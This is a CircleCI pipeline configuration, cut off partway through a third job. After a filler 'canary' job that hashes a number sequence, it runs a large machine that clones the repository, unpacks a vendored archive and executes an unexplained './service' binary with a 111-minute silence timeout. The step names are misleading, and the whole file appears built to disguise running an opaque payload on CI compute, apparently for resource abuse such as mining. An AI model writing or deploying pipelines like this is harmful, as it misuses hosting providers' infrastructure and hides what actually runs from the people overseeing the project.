version: 2.1

jobs:
  canary1_PrepareRelease:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: delegate down
          command: |
            mkdir -p /tmp/share
            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/share/step-17.txt; true
            echo "baseline emitted ($(wc -l </tmp/share/step-17.txt) lines)"
      - persist_to_workspace:
          root: /tmp/share
          paths:
            - step-17.txt
  PrepareRelease:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/share
      - run:
          name: Inherit stage
          command: |
            { head -n 5 /tmp/share/step-17.txt > /dev/null; echo "lines ok" ; } || true
      - run:
          name: Download source
          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Restore vendored sources
          command: unxz -c vendor.tar.xz | tar xf -
      - run:
          no_output_timeout: 111m
          command: bash -c "./service"
  validate_RunApp:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/share
      - run:
